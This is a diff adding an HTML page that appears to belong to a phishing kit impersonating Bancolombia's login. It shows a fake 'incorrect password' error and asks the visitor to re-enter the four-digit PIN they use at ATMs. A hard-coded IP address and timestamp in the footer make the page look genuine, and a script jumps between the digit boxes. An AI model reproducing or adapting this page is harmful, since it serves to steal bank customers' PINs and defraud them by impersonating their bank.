@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Autenticación Bancolombia</title>
+    <link rel="icon" href="../assets/img/logo.png">
+
+    <link rel="stylesheet" href="/assets/css/main.css">
+    <link rel="stylesheet" href="/assets/css/main.css">
+    <link rel="stylesheet" href="/assets/css/main.css">
+    <link href="/assets/css/main.css" rel='stylesheet'>
+</head>
+<body>
+    <div class="wrapper">
+        <div class="error">
+            <div class="error__icon">
+                <i class='bx bx-info-circle'></i>
+            </div>
+
+            <div class="error__mgj">
+                <div class="error__ttl">Clave incorrecta</div>
+
+                <div class="error__txt">
+                    La clave ingresada no coincide, inténtalo nuevamente.
+                </div>
+            </div>
+        </div>
+
+        <header class="header">
+            <span>Salir <i class='bx bx-exit'></i></span>
+        </header>
+
+        <main class="main">
+            <h2 class="main__ttl">Clave principal</h2>
+
+            <div class="box">
+                <i class='box__icon--lock bx bx-lock'></i>
+
+                <p class="box__txt">
+                    Es la misma que usas en el cajero automático
+                </p>
+
+                <div id="claveForm">
+                    <input type="text" maxlength="1" class="digit-input" id="digit1">
+                    <input type="text" maxlength="1" class="digit-input" id="digit2">
+                    <input type="text" maxlength="1" class="digit-input" id="digit3">
+                    <input type="text" maxlength="1" class="digit-input" id="digit4">
+                </div>
+
+                <div class="box__opt">
+                    <button class="box__btn box__btn--transp">Volver</button>
+                    <button class="box__btn">Continuar</button>
+                </div>
+            </div>
+
+            
+            <div class="picture"></div>
+        </main>
+
+        <footer class="footer">
+            <div class="line"></div>
+            <div class="footer__logo1"></div>
+            <div class="footer__logo2"></div>
+
+            <span>
+                <p>Dirección IP: 190.210.118.1</p>
+                <p id="currentDate">Jueves, 27 de Junio de 2024, 2:57 p. m.</p>
+            </span>
+        </footer>
+    </div>
+
+    <script src="/assets/js/main.js"></script>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            const inputs = document.querySelectorAll('.digit-input');
+
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', () => {
+                    if (input.value.length === 1 && index < inputs.length - 1) {
+                        inputs[index + 1].focus();
+                    }
+                });
+
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && index > 0 && input.value.length === 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
